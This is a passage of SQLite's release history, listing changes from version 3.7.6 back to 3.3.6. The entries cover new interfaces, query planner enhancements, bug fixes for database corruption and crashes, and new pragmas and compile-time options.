checkpoints. Improvements to the query planner so that it makes better estimates of plan costs and hence does a better job of choosing the right plan, especially when SQLITE_ENABLE_STAT2 is used. Fix a bug which prevented deferred foreign key constraints from being enforced when sqlite3_finalize() was not called by one statement with a failed foreign key constraint prior to another statement with foreign key constraints running. Integer arithmetic operations that would have resulted in overflow are now performed using floating-point instead. Increased the version number on the VFS object to 3 and added new methods xSetSysCall, xGetSysCall, and xNextSysCall used for doing full-coverage testing. Increase the maximum value of SQLITE_MAX_ATTACHED from 30 to 62 (though the default value remains at 10). Enhancements to FTS4: Added the fts4aux table Added support for compressed FTS4 content Enhance the ANALYZE command to support the name of an index as its argument, in order to analyze just that one index. Added the \"unix-excl\" built-in VFS on unix and unix-like platforms. SQLITE_SOURCE_ID: \"2011-04-12 01:58:40 f9d43fa363d54beab6f45db005abac0a7c0c47a7\" SHA1 for sqlite3.c: f38df08547efae0ff4343da607b723f588bbd66b 2011-02-01 (3.7.5) Added the sqlite3_vsnprintf() interface. Added the SQLITE_DBSTATUS_LOOKASIDE_HIT, SQLITE_DBSTATUS_LOOKASIDE_MISS_SIZE, and SQLITE_DBSTATUS_LOOKASIDE_MISS_FULL options for the sqlite3_db_status() interface. Added the SQLITE_OMIT_AUTORESET compile-time option. Added the SQLITE_DEFAULT_FOREIGN_KEYS compile-time option. Updates to sqlite3_stmt_readonly() so that its result is well-defined for all prepared statements and so that it works with VACUUM. Added the \"-heap\" option to the command-line shell Fix a bug involving frequent changes in and out of WAL mode and VACUUM that could (in theory) cause database corruption. Enhance the sqlite3_trace() mechanism so that nested SQL statements such as might be generated by virtual tables are shown but are shown in comments and without parameter expansion. This greatly improves tracing output when using the FTS3/4 and/or RTREE virtual tables. Change the xFileControl() methods on all built-in VFSes to return SQLITE_NOTFOUND instead of SQLITE_ERROR for an unrecognized operation code. The SQLite core invokes the SQLITE_FCNTL_SYNC_OMITTED file control to the VFS in place of a call to xSync if the database has PRAGMA synchronous set to OFF. 2010-12-07 (3.7.4) Added the sqlite3_blob_reopen() interface to allow an existing sqlite3_blob object to be rebound to a new row. Use the new sqlite3_blob_reopen() interface to improve the performance of FTS. VFSes that do not support shared memory are allowed to access WAL databases if PRAGMA locking_mode is set to EXCLUSIVE. Enhancements to EXPLAIN QUERY PLAN. Added the sqlite3_stmt_readonly() interface. Added PRAGMA checkpoint_fullfsync. Added the SQLITE_FCNTL_FILE_POINTER option to sqlite3_file_control(). Added support for FTS4 and enhancements to the FTS matchinfo() function. Added the test_superlock.c module which provides example code for obtaining an exclusive lock to a rollback or WAL database. Added the test_multiplex.c module which provides an example VFS that provides multiplexing (sharding) of a DB, splitting it over multiple files of fixed size. A very obscure bug associated with the or optimization was fixed. 2010-10-08 (3.7.3) Added the sqlite3_create_function_v2() interface that includes a destructor callback. Added support for custom r-tree queries using application-supplied callback routines to define the boundary of the query region. The default page cache strives more diligently to avoid using memory beyond what is allocated to it by SQLITE_CONFIG_PAGECACHE. Or if using page cache is allocating from the heap, it strives to avoid going over the sqlite3_soft_heap_limit64(), even if SQLITE_ENABLE_MEMORY_MANAGEMENT is not set. Added the sqlite3_soft_heap_limit64() interface as a replacement for sqlite3_soft_heap_limit(). The ANALYZE command now gathers statistics on tables even if they have no indices. Tweaks to the query planner to help it do a better job of finding the most efficient query plan for each query. Enhanced the internal text-to-numeric conversion routines so that they work with UTF8 or UTF16, thereby avoiding some UTF16-to-UTF8 text conversions. Fix a problem that was causing excess memory usage with large WAL transactions in win32 systems. The interface between the VDBE and B-Tree layer is enhanced such that the VDBE provides hints to the B-Tree layer letting the B-Tree layer know when it is safe to use hashing instead of B-Trees for transient tables. Miscellaneous documentation enhancements. 2010-08-24 (3.7.2) Fix an old and very obscure bug that can lead to corruption of the database free-page list when incremental_vacuum is used. 2010-08-23 (3.7.1) Added new commands SQLITE_DBSTATUS_SCHEMA_USED and SQLITE_DBSTATUS_STMT_USED to the sqlite3_db_status() interface, in order to report out the amount of memory used to hold the schema and prepared statements of a connection. Increase the maximum size of a database pages from 32KiB to 64KiB. Use the LIKE optimization even if the right-hand side string contains no wildcards. Added the SQLITE_FCNTL_CHUNK_SIZE verb to the sqlite3_file_control() interface for both unix and windows, to cause database files to grow in large chunks in order to reduce disk fragmentation. Fixed a bug in the query planner that caused performance regressions relative to 3.6.23.1 on some complex joins. Fixed a typo in the OS/2 backend. Refactored the pager module. The SQLITE_MAX_PAGE_SIZE compile-time option is now silently ignored. The maximum page size is hard-coded at 65536 bytes. 2010-08-04 (3.7.0.1) Fix a potential database corruption bug that can occur if version 3.7.0 and version 3.6.23.1 alternately write to the same database file. Ticket [51ae9cad317a1] Fix a performance regression related to the query planner enhancements of version 3.7.0. 2010-07-21 (3.7.0) Added support for write-ahead logging. Query planner enhancement - automatic transient indices are created when doing so reduces the estimated query time. Query planner enhancement - the ORDER BY becomes a no-op if the query also contains a GROUP BY clause that forces the correct output order. Add the SQLITE_DBSTATUS_CACHE_USED verb for sqlite3_db_status(). The logical database size is now stored in the database header so that bytes can be appended to the end of the database file without corrupting it and so that SQLite will work correctly on systems that lack support for ftruncate(). 2010-03-26 (3.6.23.1) Fix a bug in the offsets() function of FTS3 Fix a missing \"sync\" that when omitted could lead to database corruption if a power failure or OS crash occurred just as a ROLLBACK operation was finishing. 2010-03-09 (3.6.23) Added the secure_delete pragma. Added the sqlite3_compileoption_used() and sqlite3_compileoption_get() interfaces as well as the compile_options pragma and the sqlite_compileoption_used() and sqlite_compileoption_get() SQL functions. Added the sqlite3_log() interface together with the SQLITE_CONFIG_LOG verb to sqlite3_config(). The \".log\" command is added to the Command Line Interface. Improvements to FTS3. Improvements and bug-fixes in support for SQLITE_OMIT_FLOATING_POINT. The integrity_check pragma is enhanced to detect out-of-order rowids. The \".genfkey\" operator has been removed from the Command Line Interface. Updates to the co-hosted Lemon LALR(1) parser generator. (These updates did not affect SQLite.) Various minor bug fixes and performance enhancements. 2010-01-06 (3.6.22) Fix bugs that can (rarely) lead to incorrect query results when the CAST or OR operators are used in the WHERE clause of a query. Continuing enhancements and improvements to FTS3. Other miscellaneous bug fixes. 2009-12-07 (3.6.21) The SQL output resulting from sqlite3_trace() is now modified to include the values of bound parameters. Performance optimizations targeting a specific use case from a single high-profile user of SQLite. A 12% reduction in the number of CPU operations is achieved (as measured by Valgrind). Actual performance improvements in practice may vary depending on workload. Changes include: The ifnull() and coalesce() SQL functions are now implemented using in-line VDBE code rather than calling external functions, so that unused arguments need never be evaluated. The substr() SQL function does not bother to measure the length its entire input string if it is only computing a prefix Unnecessary OP_IsNull, OP_Affinity, and OP_MustBeInt VDBE opcodes are suppressed Various code refactorizations for performance The FTS3 extension has undergone a major rework and cleanup. New FTS3 documentation is now available. The SQLITE_SECURE_DELETE compile-time option fixed to make sure that content is deleted even when the truncate optimization applies. Improvements to \"dot-command\" handling in the Command Line Interface. Other minor bug fixes and documentation enhancements. 2009-11-04 (3.6.20) Optimizer enhancement: prepared statements are automatically re-compiled when a binding on the RHS of a LIKE operator changes or when any range constraint changes under SQLITE_ENABLE_STAT2. Various minor bug fixes and documentation enhancements. 2009-10-30 (3.6.16.1) A small patch to version 3.6.16 to fix the OP_If bug. 2009-10-14 (3.6.19) Added support for foreign key constraints. Foreign key constraints are disabled by default. Use the foreign_keys pragma to turn them on. Generalized the IS and IS NOT operators to take arbitrary expressions on their right-hand side. The TCL Interface has been enhanced to use the Non-Recursive Engine (NRE) interface to the TCL interpreter when linked against TCL 8.6 or later. Fix a bug introduced in 3.6.18 that can lead to a segfault when an attempt is made to write on a read-only database. 2009-09-11 (3.6.18) Versioning of the SQLite source code has transitioned from CVS to Fossil. Query planner enhancements. The SQLITE_ENABLE_STAT2 compile-time option causes the ANALYZE command to collect a small histogram of each index, to help SQLite better select among competing range query indices. Recursive triggers can be enabled using the PRAGMA recursive_triggers statement. Delete triggers fire when rows are removed due to a REPLACE conflict resolution. This feature is only enabled when recursive triggers are enabled. Added the SQLITE_OPEN_SHAREDCACHE and SQLITE_OPEN_PRIVATECACHE flags for sqlite3_open_v2() used to override the global shared cache mode settings for individual database connections. Added improved version identification features: C-Preprocessor macro SQLITE_SOURCE_ID, C/C++ interface sqlite3_sourceid(), and SQL function sqlite_source_id(). Obscure bug fix on triggers ([efc02f9779]). 2009-08-10 (3.6.17) Expose the sqlite3_strnicmp() interface for use by extensions and applications. Remove the restriction on virtual tables and shared cache mode. Virtual tables and shared cache can now be used at the same time. Many code simplifications and obscure bug fixes in support of providing 100% branch test coverage. 2009-06-27 (3.6.16) Fix a bug (ticket #3929) that occasionally causes INSERT or UPDATE operations to fail on an indexed table that has a self-modifying trigger. Other minor bug fixes and performance optimizations. 2009-06-15 (3.6.15) Refactor the internal representation of SQL expressions so that they use less memory on embedded platforms. Reduce the amount of stack space used Fix an 64-bit alignment bug on HP/UX and Sparc The sqlite3_create_function() family of interfaces now return SQLITE_MISUSE instead of SQLITE_ERROR when passed invalid parameter combinations. When new tables are created using CREATE TABLE ... AS SELECT ... the datatype of the columns is the simplified SQLite datatype (TEXT, INT, REAL, NUMERIC, or BLOB) instead of a copy of the original datatype from the source table. Resolve race conditions when checking for a hot rollback journal. The sqlite3_shutdown() interface frees all mutexes under windows. Enhanced robustness against corrupt database files Continuing improvements to the test suite and fixes to obscure bugs and inconsistencies that the test suite improvements are uncovering. 2009-05-25 (3.6.14.2) Fix a code generator bug introduced in version 3.6.14. This bug can cause incorrect query results under obscure circumstances. Ticket #3879. 2009-05-19 (3.6.14.1) Fix a bug in group_concat(), ticket #3841 Fix a performance bug in the pager cache, ticket #3844 Fix a bug in the sqlite3_backup implementation that can lead to a corrupt backup database. Ticket #3858. 2009-05-07 (3.6.14) Added the optional asynchronous VFS module. Enhanced the query optimizer so that virtual tables are able to make use of OR and IN operators in the WHERE clause. Speed improvements in the btree and pager layers. Added the SQLITE_HAVE_ISNAN compile-time option which will cause the isnan() function from the standard math library to be used instead of SQLite's own home-brew NaN checker. Countless minor bug fixes, documentation improvements, new and improved test cases, and code simplifications and cleanups. 2009-04-13 (3.6.13) Fix a bug in version 3.6.12 that causes a segfault when running a count(*) on the sqlite_master table of an empty database. Ticket #3774. Fix a bug in version 3.6.12 that causes a segfault that when inserting into a table using a DEFAULT value where there is a function as part of the DEFAULT value expression. Ticket #3791. Fix data structure alignment issues on Sparc. Ticket #3777. Other minor bug fixes. 2009-03-31 (3.6.12) Fixed a bug that caused database corruption when an incremental_vacuum is rolled back in an in-memory database. Ticket #3761. Added the sqlite3_unlock_notify() interface. Added the reverse_unordered_selects pragma. The default page size on windows is automatically adjusted to match the capabilities of the underlying filesystem. Add the new \".genfkey\" command in the CLI for generating triggers to implement foreign key constraints. Performance improvements for \"count(*)\" queries. Reduce the amount of heap memory used, especially by TRIGGERs. 2009-02-18 (3.6.11) Added the hot-backup interface. Added new commands \".backup\" and \".restore\" to the CLI. Added new methods backup and restore to the TCL interface. Improvements to the syntax bubble diagrams Various minor bug fixes 2009-01-15 (3.6.10) Fix a cache coherency problem that could lead to database corruption. Ticket #3584. 2009-01-14 (3.6.9) Fix two bugs, which when combined might result in incorrect query results. Both bugs were harmless by themselves; only when they team up do they cause problems. Ticket #3581. 2009-01-12 (3.6.8) Added support for nested transactions Enhanced the query optimizer so that it is able to use multiple indices to efficiently process OR-connected constraints in a WHERE clause. Added support for parentheses in FTS3 query patterns using the SQLITE_ENABLE_FTS3_PARENTHESIS compile-time option. 2008-12-16 (3.6.7) Reorganize the Unix interface in os_unix.c Added support for \"Proxy Locking\" on Mac OS X. Changed the prototype of the sqlite3_auto_extension() interface in a way that is backwards compatible but which might cause warnings in new builds of applications that use that interface. Changed the signature of the xDlSym method of the sqlite3_vfs object in a way that is backwards compatible but which might cause compiler warnings. Added superfluous casts and variable initializations in order to suppress nuisance compiler warnings. Fixes for various minor bugs. 2008-11-26 (3.6.6.2) Fix a bug in the b-tree delete algorithm that seems like it might be able to cause database corruption. The bug was first introduced in version 3.6.6 by check-in [5899] on 2008-11-13. Fix a memory leak that can occur following a disk I/O error. 2008-11-22 (3.6.6.1) Fix a bug in the page cache that can lead database corruption following a rollback. This bug was first introduced in version 3.6.4. Two other very minor bug fixes 2008-11-19 (3.6.6) Fix a #define that prevented memsys5 from compiling Fix a problem in the virtual table commit mechanism that was causing a crash in FTS3. Ticket #3497. Add the application-defined page cache Added built-in support for VxWorks 2008-11-12 (3.6.5) Add the MEMORY option to the journal_mode pragma. Added the sqlite3_db_mutex() interface. Added the SQLITE_OMIT_TRUNCATE_OPTIMIZATION compile-time option. Fixed the truncate optimization so that sqlite3_changes() and sqlite3_total_changes() interfaces and the count_changes pragma return the correct values. Added the sqlite3_extended_errcode() interface. The COMMIT command now succeeds even if there are pending queries. It returns SQLITE_BUSY if there are pending incremental BLOB I/O requests. The error code is changed to SQLITE_BUSY (instead of SQLITE_ERROR) when an attempt is made to ROLLBACK while one or more queries are still pending. Drop all support for the experimental memory allocators memsys4 and memsys6. Added the SQLITE_ZERO_MALLOC compile-time option. 2008-10-15 (3.6.4) Add option support for LIMIT and ORDER BY clauses on DELETE and UPDATE statements. Only works if SQLite is compiled with SQLITE_ENABLE_UPDATE_DELETE_LIMIT. Added the sqlite3_stmt_status() interface for performance monitoring. Add the INDEXED BY clause. The LOCKING_STYLE extension is now enabled by default on Mac OS X Added the TRUNCATE option to PRAGMA journal_mode Performance enhancements to tree balancing logic in the B-Tree layer. Added the source code and documentation for the genfkey program for automatically generating triggers to enforce foreign key constraints. Added the SQLITE_OMIT_TRUNCATE_OPTIMIZATION compile-time option. The SQL language documentation is converted to use syntax diagrams instead of BNF. Other minor bug fixes 2008-09-22 (3.6.3) Fix for a bug in the SELECT DISTINCT logic that was introduced by the prior version. Other minor bug fixes 2008-08-30 (3.6.2) Split the pager subsystem into separate pager and pcache subsystems. Factor out identifier resolution procedures into separate files. Bug fixes 2008-08-06 (3.6.1) Added the lookaside memory allocator for a speed improvement in excess of 15% on some workloads. (Your mileage may vary.) Added the SQLITE_CONFIG_LOOKASIDE verb to sqlite3_config() to control the default lookaside configuration. Added verbs SQLITE_STATUS_PAGECACHE_SIZE and SQLITE_STATUS_SCRATCH_SIZE to the sqlite3_status() interface. Modified SQLITE_CONFIG_PAGECACHE and SQLITE_CONFIG_SCRATCH to remove the \"+4\" magic number in the buffer size computation. Added the sqlite3_db_config() and sqlite3_db_status() interfaces for controlling and monitoring the lookaside allocator separately on each database connection. Numerous other performance enhancements Miscellaneous minor bug fixes 2008-07-16 (3.6.0 beta) Modifications to the virtual file system interface to support a wider range of embedded systems. See 35to36.html for additional information. *** Potentially incompatible change *** All C-preprocessor macros used to control compile-time options now begin with the prefix \"SQLITE_\". This may require changes to applications that compile SQLite using their own makefiles and with custom compile-time options, hence we mark this as a *** Potentially incompatible change *** The SQLITE_MUTEX_APPDEF compile-time option is no longer supported. Alternative mutex implementations can now be added at run-time using the sqlite3_config() interface with the SQLITE_CONFIG_MUTEX verb. *** Potentially incompatible change *** The handling of IN and NOT IN operators that contain a NULL on their right-hand side expression is brought into compliance with the SQL standard and with other SQL database engines. This is a bug fix, but as it has the potential to break legacy applications that depend on the older buggy behavior, we mark that as a *** Potentially incompatible change *** The result column names generated for compound subqueries have been simplified to show only the name of the column of the original table and omit the table name. This makes SQLite operate more like other SQL database engines. Added the sqlite3_config() interface for doing run-time configuration of the entire SQLite library. Added the sqlite3_status() interface used for querying run-time status information about the overall SQLite library and its subsystems. Added the sqlite3_initialize() and sqlite3_shutdown() interfaces. The SQLITE_OPEN_NOMUTEX option was added to sqlite3_open_v2(). Added the PRAGMA page_count command. Added the sqlite3_next_stmt() interface. Added a new R*Tree virtual table 2008-05-14 (3.5.9) Added experimental support for the journal_mode PRAGMA and persistent journal. Journal mode PERSIST is the default behavior in exclusive locking mode. Fix a performance regression on LEFT JOIN (see ticket #3015) that was mistakenly introduced in version 3.5.8. Performance enhancement: Reengineer the internal routines used to interpret and render variable-length integers. Fix a buffer-overrun problem in sqlite3_mprintf() which occurs when a string without a zero-terminator is passed to \"%.*s\". Always convert IEEE floating point NaN values into NULL during processing. (Ticket #3060) Make sure that when a connection blocks on a RESERVED lock that it is able to continue after the lock is released. (Ticket #3093) The \"configure\" scripts should now automatically configure Unix systems for large file support. Improved error messages for when large files are encountered and large file support is disabled. Avoid cache pages leaks following disk-full or I/O errors And, many more minor bug fixes and performance enhancements.... 2008-04-16 (3.5.8) Expose SQLite's internal pseudo-random number generator (PRNG) via the sqlite3_randomness() interface New interface sqlite3_context_db_handle() that returns the database connection handle that has invoked an application-defined SQL function. New interface sqlite3_limit() allows size and length limits to be set on a per-connection basis and at run-time. Improved crash-robustness: write the database page size into the rollback journal header. Allow the VACUUM command to change the page size of a database file. The xAccess() method of the VFS is allowed to return -1 to signal a memory allocation error. Performance improvement: The OP_IdxDelete opcode uses unpacked records, obviating the need for one OP_MakeRecord opcode call for each index record deleted. Performance improvement: Constant subexpressions are factored out of loops. Performance improvement: Results of OP_Column are reused rather than issuing multiple OP_Column opcodes. Fix a bug in the RTRIM collating sequence. Fix a bug in the SQLITE_SECURE_DELETE option that was causing Firefox crashes. Make arrangements to always test SQLITE_SECURE_DELETE prior to each release. Other miscellaneous performance enhancements. Other miscellaneous minor bug fixes. 2008-03-17 (3.5.7) Fix a bug (ticket #2927) in the register allocation for compound selects - introduced by the new VM code in version 3.5.5. ALTER TABLE uses double-quotes instead of single-quotes for quoting filenames. Use the WHERE clause to reduce the size of a materialized VIEW in an UPDATE or DELETE statement. (Optimization) Do not apply the flattening optimization if the outer query is an aggregate and the inner query contains ORDER BY. (Ticket #2943) Additional OS/2 updates Added an experimental power-of-two, first-fit memory allocator. Remove all instances of sprintf() from the code Accept \"Z\" as the zulu timezone at the end of date strings Fix a bug in the LIKE optimizer that occurs when the last character before the first wildcard is an upper-case \"Z\" Added the \"bitvec\" object for keeping track of which pages have been journalled. Improves speed and reduces memory consumption, especially for large database files. Get the SQLITE_ENABLE_LOCKING_STYLE macro working again on Mac OS X. Store the statement journal in the temporary file directory instead of collocated with the database file. Many improvements and cleanups to the configure script 2008-02-06 (3.5.6) Fix a bug (ticket #2913) that prevented virtual tables from working in a LEFT JOIN. The problem was introduced into shortly before the 3.5.5 release. Bring the OS/2 porting layer up-to-date. Add the new sqlite3_result_error_code() API and use it in the implementation of ATTACH so that proper error codes are returned when an ATTACH fails. 2008-01-31 (3.5.5) Convert the underlying virtual machine to be a register-based machine rather than a stack-based machine. The only user-visible change is in the output of EXPLAIN. Add the build-in RTRIM collating sequence. 2007-12-14 (3.5.4) Fix a critical bug in UPDATE or DELETE that occurs when an OR REPLACE clause or a trigger causes rows in the same table to be deleted as side effects. (See ticket #2832.) The most likely result of this bug is a segmentation fault, though database corruption is a possibility. Bring the processing of ORDER BY into compliance with the SQL standard for case where a result alias and a table column name are in conflict. Correct behavior is to prefer the result alias. Older versions of SQLite incorrectly picked the table column. (See ticket #2822.) The VACUUM command preserves the setting of the legacy_file_format pragma. (Ticket #2804.) Productize and officially support the group_concat() SQL function. Better optimization of some IN operator expressions. Add the ability to change the auto_vacuum status of a database by setting the auto_vaccum pragma and VACUUMing the database. Prefix search in FTS3 is much more efficient. Relax the SQL statement length restriction in the CLI so that the \".dump\" output of databases with very large BLOBs and strings can be played back to recreate the database. Other small bug fixes and optimizations. 2007-11-27 (3.5.3) Move website and documentation files out of the source tree into a separate CM system. Fix a long-standing bug in INSERT INTO ... SELECT ... statements where the SELECT is compound. Fix a long-standing bug in RAISE(IGNORE) as used in BEFORE triggers. Fixed the operator precedence for the ~ operator. On Win32, do not return an error when attempting to delete a file that does not exist. Allow collating sequence names to be quoted. Modify the TCL interface to use sqlite3_prepare_v2(). Fix multiple bugs that can occur following a malloc() failure. sqlite3_step() returns SQLITE_MISUSE instead of crashing when called with a NULL parameter. FTS3 now uses the SQLite memory allocator exclusively. The FTS3 amalgamation can now be appended to the SQLite amalgamation to generate a super-amalgamation containing both. The DISTINCT keyword now will sometimes use an INDEX if an appropriate index is available and the optimizer thinks its use might be advantageous. 2007-11-05 (3.5.2) Dropped support for the SQLITE_OMIT_MEMORY_ALLOCATION compile-time option. Always open files using FILE_FLAG_RANDOM_ACCESS under Windows. The 3rd parameter of the built-in SUBSTR() function is now optional. Bug fix: do not invoke the authorizer when reparsing the schema after a schema change. Added the experimental malloc-free memory allocator in mem3.c. Virtual machine stores 64-bit integer and floating point constants in binary instead of text for a performance boost. Fix a race condition in test_async.c. Added the \".timer\" command to the CLI 2007-10-04 (3.5.1) Nota Bene: We are not using terms \"alpha\" or \"beta\" on this release because the code is stable and because if we use those terms, nobody will upgrade. However, we still reserve the right to make incompatible changes to the new VFS interface in future releases. Fix a bug in the handling of SQLITE_FULL errors that could lead to database corruption. Ticket #2686. The test_async.c drive now does full file locking and works correctly when used simultaneously by multiple processes on the same database. The CLI ignores whitespace (including comments) at the end of lines Make sure the query optimizer checks dependencies on all terms of a compound SELECT statement. Ticket #2640. Add demonstration code showing how to build a VFS for a raw mass storage without a filesystem. Added an output buffer size parameter to the xGetTempname() method of the VFS layer. Sticky SQLITE_FULL or SQLITE_IOERR errors in the pager are reset when a new transaction is started. 2007-09-04 (3.5.0) alpha Redesign the OS interface layer. See 34to35.html for details. *** Potentially incompatible change *** The sqlite3_release_memory(), sqlite3_soft_heap_limit(), and sqlite3_enable_shared_cache() interfaces now work cross all threads in the process, not just the single thread in which they are invoked. *** Potentially incompatible change *** Added the sqlite3_open_v2() interface. Reimplemented the memory allocation subsystem and made it replaceable at compile-time. Created a new mutex subsystem and made it replicable at compile-time. The same database connection may now be used simultaneously by separate threads. 2007-08-13 (3.4.2) Fix a database corruption bug that might occur if a ROLLBACK command is executed in auto-vacuum mode and a very small sqlite3_soft_heap_limit is set. Ticket #2565. Add the ability to run a full regression test with a small sqlite3_soft_heap_limit. Fix other minor problems with using small soft heap limits. Work-around for GCC bug 32575. Improved error detection of misused aggregate functions. Improvements to the amalgamation generator script so that all symbols are prefixed with either SQLITE_PRIVATE or SQLITE_API. 2007-07-20 (3.4.1) Fix a bug in VACUUM that can lead to database corruptio if two processes are connected to the database at the same time and one VACUUMs then the other then modifies the database. The expression \"+column\" is now considered the same as \"column\" when computing the collating sequence to use on the expression. In the TCL language interface, \"@variable\" instead of \"$variable\" always binds as a blob. Added PRAGMA freelist_count for determining the current size of the freelist. The PRAGMA auto_vacuum=incremental setting is now persistent. Add FD_CLOEXEC to all open files under Unix. Fix a bug in the min()/max() optimization when applied to descending indices. Make sure the TCL language interface works correctly with 64-bit integers on 64-bit machines. Allow the value -9223372036854775808 as an integer literal in SQL statements. Add the capability of \"hidden\" columns in virtual tables. Use the macro SQLITE_PRIVATE (defaulting to \"static\") on all internal functions in the amalgamation. Add pluggable tokenizers and ICU tokenization support to FTS2 Other minor bug fixes and documentation enhancements 2007-06-18 (3.4.0) Fix a bug that can lead to database corruption if an SQLITE_BUSY error occurs in the middle of an explicit transaction and that transaction is later committed. Ticket #2409. Fix a bug that can lead to database corruption if autovacuum mode is on and a malloc() failure follows a CREATE TABLE or CREATE INDEX statement which itself follows a cache overflow inside a transaction. See ticket #2418. Added explicit upper bounds on the sizes and quantities of things SQLite can process. This change might cause compatibility problems for applications that use SQLite in the extreme, which is why the current release is 3.4.0 instead of 3.3.18. Added support for Incremental BLOB I/O. Added the sqlite3_bind_zeroblob() API and the zeroblob() SQL function. Added support for Incremental Vacuum. Added the SQLITE_MIXED_ENDIAN_64BIT_FLOAT compile-time option to support ARM7 processors with goofy endianness. Removed all instances of sprintf() and strcpy() from the core library. Added support for International Components for Unicode (ICU) to the full-text search extensions. In the Windows OS driver, reacquire a SHARED lock if an attempt to acquire an EXCLUSIVE lock fails. Ticket #2354 Fix the REPLACE() function so that it returns NULL if the second argument is an empty string. Ticket #2324. Document the hazards of type conversions in sqlite3_column_blob() and related APIs. Fix unnecessary type conversions. Ticket #2321. Internationalization of the TRIM() function. Ticket #2323 Use memmove() instead of memcpy() when moving between memory regions that might overlap. Ticket #2334 Fix an optimizer bug involving subqueries in a compound SELECT that has both an ORDER BY and a LIMIT clause. Ticket #2339. Make sure the sqlite3_snprintf() interface does not zero-terminate the buffer if the buffer size is less than 1. Ticket #2341 Fix the built-in printf logic so that it prints \"NaN\" not \"Inf\" for floating-point NaNs. Ticket #2345 When converting BLOB to TEXT, use the text encoding of the main database. Ticket #2349 Keep the full precision of integers (if possible) when casting to NUMERIC. Ticket #2364 Fix a bug in the handling of UTF16 codepoint 0xE000 Consider explicit collate clauses when matching WHERE constraints to indices in the query optimizer. Ticket #2391 Fix the query optimizer to correctly handle constant expressions in the ON clause of a LEFT JOIN. Ticket #2403 Fix the query optimizer to handle rowid comparisons to NULL correctly. Ticket #2404 Fix many potential segfaults that could be caused by malicious SQL statements. 2007-04-25 (3.3.17) When the \"write_version\" value of the database header is larger than what the library understands, make the database read-only instead of unreadable. Other minor bug fixes 2007-04-18 (3.3.16) Fix a bug that caused VACUUM to fail if NULLs appeared in a UNIQUE column. Reinstate performance improvements that were added in Version 3.3.14 but regressed in Version 3.3.15. Fix problems with the handling of ORDER BY expressions on compound SELECT statements in subqueries. Fix a potential segfault when destroying locks on WinCE in a multi-threaded environment. Documentation updates. 2007-04-09 (3.3.15) Fix a bug introduced in 3.3.14 that caused a rollback of CREATE TEMP TABLE to leave the database connection wedged. Fix a bug that caused an extra NULL row to be returned when a descending query was interrupted by a change to the database. The FOR EACH STATEMENT clause on a trigger now causes a syntax error. It used to be silently ignored. Fix an obscure and relatively harmless problem that might have caused a resource leak following an I/O error. Many improvements to the test suite. Test coverage now exceeded 98% 2007-04-02 (3.3.14) Fix a bug (ticket #2273) that could cause a segfault when the IN operator is used one one term of a two-column index and the right-hand side of the IN operator contains a NULL. Added a new OS interface method for determining the sector size of underlying media: sqlite3OsSectorSize(). A new algorithm for statements of the form INSERT INTO table1 SELECT * FROM table2 is faster and reduces fragmentation. VACUUM uses statements of this form and thus runs faster and defragments better. Performance enhancements through reductions in disk I/O: Do not read the last page of an overflow chain when deleting the row - just add that page to the freelist. Do not store pages being deleted in the rollback journal. Do not read in the (meaningless) content of pages extracted from the freelist. Do not flush the page cache (and thus avoiding a cache refill) unless another process changes the underlying database file. Truncate rather than delete the rollback journal when committing a transaction in exclusive access mode, or when committing the TEMP database. Added support for exclusive access mode using \"PRAGMA locking_mode=EXCLUSIVE\" Use heap space instead of stack space for large buffers in the pager - useful on embedded platforms with stack-space limitations. Add a makefile target \"sqlite3.c\" that builds an amalgamation containing the core SQLite library C code in a single file. Get the library working correctly when compiled with GCC option \"-fstrict-aliasing\". Removed the vestigal SQLITE_PROTOCOL error. Improvements to test coverage, other minor bugs fixed, memory leaks plugged, code refactored and/or recommended in places for easier reading. 2007-02-13 (3.3.13) Add a \"fragmentation\" measurement in the output of sqlite3_analyzer. Add the COLLATE operator used to explicitly set the collating sequence used by an expression. This feature is considered experimental pending additional testing. Allow up to 64 tables in a join - the old limit was 32. Added two new experimental functions: randomBlob() and hex(). Their intended use is to facilitate generating UUIDs. Fix a problem where PRAGMA count_changes was causing incorrect results for updates on tables with triggers Fix a bug in the ORDER BY clause optimizer for joins where the left-most table in the join is constrained by a UNIQUE index. Fixed a bug in the \"copy\" method of the TCL interface. Bug fixes in fts1 and fts2 modules. 2007-01-27 (3.3.12) Fix another bug in the IS NULL optimization that was added in version 3.3.9. Fix an assertion fault that occurred on deeply nested views. Limit the amount of output that PRAGMA integrity_check generates. Minor syntactic changes to support a wider variety of compilers. 2007-01-22 (3.3.11) Fix another bug in the implementation of the new sqlite3_prepare_v2() API. We'll get it right eventually... Fix a bug in the IS NULL optimization that was added in version 3.3.9 - the bug was causing incorrect results on certain LEFT JOINs that included in the WHERE clause an IS NULL constraint for the right table of the LEFT JOIN. Make AreFileApisANSI() a no-op macro in WinCE since WinCE does not support this function. 2007-01-09 (3.3.10) Fix bugs in the implementation of the new sqlite3_prepare_v2() API that can lead to segfaults. Fix 1-second round-off errors in the strftime() function Enhance the Windows OS layer to provide detailed error codes Work around a win2k problem so that SQLite can use single-character database file names The user_version and schema_version pragmas correctly set their column names in the result set Documentation updates 2007-01-04 (3.3.9) Fix bugs in pager.c that could lead to database corruption if two processes both try to recover a hot journal at the same instant Added the sqlite3_prepare_v2() API. Fixed the \".dump\" command in the command-line shell to show indices, triggers and views again. Change the table_info pragma so that it returns NULL for the default value if there is no default value Support for non-ASCII characters in win95 filenames Query optimizer enhancements: Optimizer does a better job of using indices to satisfy ORDER BY clauses that sort on the integer primary key Use an index to satisfy an IS NULL operator in the WHERE clause Fix a bug that was causing the optimizer to miss an OR optimization opportunity The optimizer has more freedom to reorder tables in the FROM clause even in there are LEFT joins. Extension loading supported added to WinCE Allow constraint names on the DEFAULT clause in a table definition Added the \".bail\" command to the command-line shell Make CSV (comma separate value) output from the command-line shell more closely aligned to accepted practice Experimental FTS2 module added Use sqlite3_mprintf() instead of strdup() to avoid libc dependencies VACUUM uses a temporary file in the official TEMP folder, not in the same directory as the original database The prefix on temporary filenames on Windows is changed from \"sqlite\" to \"etilqs\". 2006-10-09 (3.3.8) Support for full text search using the FTS1 module (beta) Added Mac OS X locking patches (beta - disabled by default) Introduce extended error codes and add error codes for various kinds of I/O errors. Added support for IF EXISTS on CREATE/DROP TRIGGER/VIEW Fix the regression test suite so that it works with Tcl8.5 Enhance sqlite3_set_authorizer() to provide notification of calls to SQL functions. Added experimental API: sqlite3_auto_extension() Various minor bug fixes 2006-08-12 (3.3.7) Added support for virtual tables (beta) Added support for dynamically loaded extensions (beta) The sqlite3_interrupt() routine can be called for a different thread Added the MATCH operator. The default file format is now 1. 2006-06-06 (3.3.6) Plays better with virus scanners on Windows Faster :memory: databases Fix an obscure segfault in UTF-8 to 